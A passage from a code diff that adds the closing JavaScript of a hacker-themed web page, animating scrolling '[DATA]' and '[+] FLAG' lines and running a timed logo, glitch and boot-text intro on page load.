+        line.startsWith('[DATA]') ? '#aaaaff' :
+        '#00cc44';
+      if (line.startsWith('[+] FLAG')) el.style.textShadow = '0 0 8px #00ff88';
+      flood.appendChild(el);
+      flood.scrollTop = flood.scrollHeight;
+      ci++;
+      setTimeout(nextCmd, 60 + Math.random()*50);
+    }
+    nextCmd();
+  }
+}
+
+// Expose for onclick
+window.selectSession = selectSession;
+
+/* ════════════════════════════════════════════
+   BOOT SEQUENCE INIT
+════════════════════════════════════════════ */
+window.addEventListener('load', ()=>{
+  goPhase('phase-logo');
+  startLogoArcs();
+
+  // Intense glitch at 3.5s
+  setTimeout(()=>{
+    document.getElementById('glitch-wrap').classList.add('glitching');
+  }, 3500);
+
+  // Transition to boot text at 4.6s
+  setTimeout(()=>{
+    arcOn = false; clearInterval(arcTimer);
+    arcCv.getContext('2d').clearRect(0,0,520,520);
+    document.getElementById('glitch-wrap').classList.remove('glitching');
+    goPhase('phase-boot');
+    runBoot();
+  }, 4600);
+});
+</script>
+</body>
+</html>
